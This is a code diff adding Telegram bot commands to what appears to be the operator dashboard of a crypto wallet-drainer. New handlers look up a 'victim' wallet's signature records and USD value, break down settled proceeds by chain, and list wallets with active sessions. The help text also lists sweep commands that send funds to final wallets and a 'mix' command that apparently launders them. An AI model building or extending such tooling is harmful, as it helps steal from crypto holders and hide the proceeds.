@@ -23,6 +23,9 @@ import {
   queryLastSettledAt,
   queryRecentSettled,
   queryTodaySettledStats,
+  queryVictimInfo,
+  queryChainBreakdown,
+  queryActiveRecentSessions,
 } from './lib/signature-vault-queries.js'
 import {
   formatHistoryTimestamp,
@@ -226,6 +229,98 @@ async function handleStatsToday(ctx: Context): Promise<void> {
   )
 }
 
+// ─── New Phase 7 handlers ─────────────────────────────────────────────────────
+
+async function handleVictim(ctx: Context): Promise<void> {
+  const text = ctx.message?.text ?? ''
+  const parts = text.trim().split(/\s+/)
+  const wallet = parts[1] ?? ''
+  if (!wallet || !/^0x[0-9a-fA-F]{2,40}$/.test(wallet)) {
+    await ctx.reply(
+      '👤 <b>Usage:</b> <code>/victim 0x1234…abcd</code>\nShows all signature records for that wallet.',
+      { parse_mode: 'HTML' },
+    )
+    return
+  }
+
+  await ctx.reply(`⏳ Looking up <code>${wallet}</code>…`, { parse_mode: 'HTML' })
+  const rows = await queryVictimInfo(wallet)
+
+  if (rows.length === 0) {
+    await ctx.reply(`📭 No records found for <code>${wallet}</code>.`, { parse_mode: 'HTML' })
+    return
+  }
+
+  const totalUsd = rows.reduce((s, r) => s + (Number(r.scout_value_usd ?? '0') || 0), 0)
+  const lines = [
+    `👤 <b>VICTIM: ${wallet.slice(0, 10)}…${wallet.slice(-4)}</b>`,
+    `💰 <b>Total value:</b> ${formatUsd(totalUsd)} across ${rows.length} record(s)`,
+    '━━━━━━━━━━━━━━━━',
+  ]
+  for (const r of rows.slice(0, 8)) {
+    const status = r.settlement_status ?? '?'
+    const chain = r.chain_id ?? '?'
+    const proto = r.protocol ?? '?'
+    const usd = formatUsd(Number(r.scout_value_usd ?? '0'))
+    const wallet_type = r.wallet_type ?? '?'
+    lines.push(`• ${status} | ${chain} | ${proto} | ${usd} | ${wallet_type} | ${(r.created_at || '').slice(0, 10)}`)
+  }
+  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
+}
+
+async function handleChains(ctx: Context): Promise<void> {
+  await ctx.reply('⏳ Building chain breakdown…', { parse_mode: 'HTML' })
+  const rows = await queryChainBreakdown()
+
+  if (rows.length === 0) {
+    await ctx.reply('📭 No settled records by chain yet.', { parse_mode: 'HTML' })
+    return
+  }
+
+  const totalUsd = rows.reduce((s, r) => s + r.total_usd, 0)
+  const totalCount = rows.reduce((s, r) => s + r.count, 0)
+
+  const lines = [
+    '⛓️ <b>CHAINS BREAKDOWN (settled only)</b>',
+    `📊 <b>Total:</b> ${totalCount} settlements | ${formatUsd(totalUsd)}`,
+    '━━━━━━━━━━━━━━━━',
+  ]
+  for (const r of rows) {
+    const pct = totalUsd > 0 ? `${((r.total_usd / totalUsd) * 100).toFixed(1)}%` : '0%'
+    lines.push(`• <b>${r.chain_id}</b> — ${r.count}× | ${formatUsd(r.total_usd)} (${pct})`)
+  }
+  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
+}
+
+async function handleActive(ctx: Context): Promise<void> {
+  const text = ctx.message?.text ?? ''
+  const parts = text.trim().split(/\s+/)
+  const minutes = Number(parts[1]) || 30
+
+  await ctx.reply(`⏳ Fetching sessions in last ${minutes}min…`, { parse_mode: 'HTML' })
+  const rows = await queryActiveRecentSessions(minutes)
+
+  if (rows.length === 0) {
+    await ctx.reply(`📭 No wallet sessions in last ${minutes} minutes.`, { parse_mode: 'HTML' })
+    return
+  }
+
+  const lines = [
+    `🔴 <b>ACTIVE SESSIONS (last ${minutes}min) — ${rows.length} entries</b>`,
+    '━━━━━━━━━━━━━━━━',
+  ]
+  for (const r of rows) {
+    const wt = truncateWallet(r.wallet_address)
+    const status = r.settlement_status ?? '?'
+    const chain = r.chain_id ?? '?'
+    const wallet_type = r.wallet_type ?? '?'
+    const usd = formatUsd(Number(r.scout_value_usd ?? '0'))
+    const ts = (r.created_at || '').slice(11, 19)  // time portion only
+    lines.push(`• <code>${wt}</code> ${status} | ${chain} | ${wallet_type} | ${usd} | ${ts}`)
+  }
+  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
+}
+
 function registerCommands(bot: Bot): void {
   bot.command('status', async (ctx) => {
     if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
@@ -376,6 +471,27 @@ function registerCommands(bot: Bot): void {
       })
   })
 
+  // Phase 7: new operator commands
+  bot.command('victim', async (ctx) => {
+    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
+    await handleVictim(ctx)
+  })
+
+  bot.command('chains', async (ctx) => {
+    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
+    await handleChains(ctx)
+  })
+
+  bot.command('today', async (ctx) => {
+    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
+    await handleStatsToday(ctx)
+  })
+
+  bot.command('active', async (ctx) => {
+    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
+    await handleActive(ctx)
+  })
+
   bot.command('osint', async (ctx) => {
     if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
     const text = ctx.message?.text ?? ''
@@ -428,6 +544,10 @@ function registerCommands(bot: Bot): void {
         '/recent [n] — last n settlements (signatures table)',
         '/history [n] — last n settlement attempts (settlement_history)',
         '/stats today — IST daily totals',
+        '/today — shortcut for /stats today',
+        '/victim &lt;wallet&gt; — all records for a specific wallet address',
+        '/chains — settled breakdown by chain + USD share',
+        '/active [min] — wallets with sessions in last N minutes (default 30)',
         '/sweep — transfer execution wallet surplus to FINAL_WALLET_* (keeps gas reserve)',
         '/swap — alias for /sweep',
         '/mix — split-withdraw mix from execution wallets (keeps gas reserve)',
